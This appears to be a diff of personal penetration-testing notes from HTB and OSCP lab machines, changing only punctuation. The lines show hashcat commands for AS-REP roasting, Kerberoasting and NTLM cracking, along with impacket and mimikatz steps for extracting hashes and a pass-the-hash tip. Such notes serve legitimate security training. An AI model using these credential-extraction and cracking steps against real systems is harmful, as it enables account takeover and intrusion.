@@ -54,18 +54,18 @@ See also: [[John]] for alternative cracking, [[Hydra]] for online brute force.
 
 ## From Your Boxes
 
-> **Forest** (HTB) — AS-REP roasting with hashcat mode 18200
+> **Forest** (HTB) - AS-REP roasting with hashcat mode 18200
 > - What worked: `hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force` cracked to `REDACTED`
 > - Lesson: AS-REP roast hashes come from `impacket-GetNPUsers`. Mode 18200, no rules needed for weak passwords
 
-> **Sauna** (HTB) — AS-REP roasting for initial access, hashcat mode 18200
+> **Sauna** (HTB) - AS-REP roasting for initial access, hashcat mode 18200
 > - What worked: `hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt --force` cracked fsmith's hash to `REDACTED`
 > - Lesson: Use `impacket-getNPUsers` with `-format hashcat` flag to output directly in hashcat format
 
-> **OSCP B — MS01** (Course) — Kerberoast hash cracked with hashcat mode 13100 + rules
+> **OSCP B - MS01** (Course) - Kerberoast hash cracked with hashcat mode 13100 + rules
 > - What worked: `sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
 > - Lesson: Kerberoast hashes (mode 13100) often need rules to crack. `best64.rule` is a good starting point. Save the hash from `impacket-GetUserSPNs -outputfile`
 
-> **Course Materials — NTLM Cracking** — NTLM hash cracking with mode 1000 + rules
+> **Course Materials - NTLM Cracking** - NTLM hash cracking with mode 1000 + rules
 > - What worked: `hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
 > - Lesson: Extract NTLM hashes via mimikatz (`sekurlsa::logonpasswords` or `lsadump::sam`), then crack with mode 1000. If cracking fails, try pass-the-hash instead
